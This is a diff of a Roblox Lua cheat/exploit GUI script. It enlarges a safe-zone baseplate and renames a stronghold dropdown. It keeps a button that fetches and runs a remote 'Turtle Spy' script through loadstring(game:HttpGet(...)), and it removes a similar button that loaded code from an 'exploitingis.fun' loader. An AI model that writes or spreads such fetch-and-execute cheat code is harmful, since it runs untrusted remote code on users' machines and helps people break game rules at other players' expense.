@@ -21,7 +21,7 @@ local player = Players.LocalPlayer
 -- Safe zone setup
 local baseplate = Instance.new("Part")
 baseplate.Name = "SafeZoneBaseplate"
-baseplate.Size = Vector3.new(9999, 1, 9999)
+baseplate.Size = Vector3.new(15000, 1, 15000)
 baseplate.Position = Vector3.new(0, 100, 0)
 baseplate.Anchored = true
 baseplate.CanCollide = true
@@ -715,11 +715,6 @@ civDropdown2:AddButton("turtle spy",function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Turtle-Brand/Turtle-Spy/main/source.lua", true))()
 end)
 
-civDropdown2:AddButton("ink game 2 (extra script)",function()
-    loadstring(game:HttpGet('https://api.exploitingis.fun/loader', true))()
-end)
-
-
 -- extra scripts
 
 
@@ -1208,7 +1203,7 @@ end)()
 -- === AUTO STRONGHOLD ===
 
 local strongholdRunning = false
-local strongholdDropdown = main:CreateDropDown("Auto Stronghold Clients")
+local strongholdDropdown = main:CreateDropDown("Auto Stronghold Notifier")
 
 -- Create the comment UI for the timer display
 local strongholdCheckbox = main:CreateComment("Stronghold Timer: N/A", function(checked)
@@ -1365,11 +1360,6 @@ miscdropdown:AddCheckbox("Auto Bring All Small Trees", function(checked)
         restoreTrees()
     end
 end)
-
-
-
-
-
 
 -- auto 
 
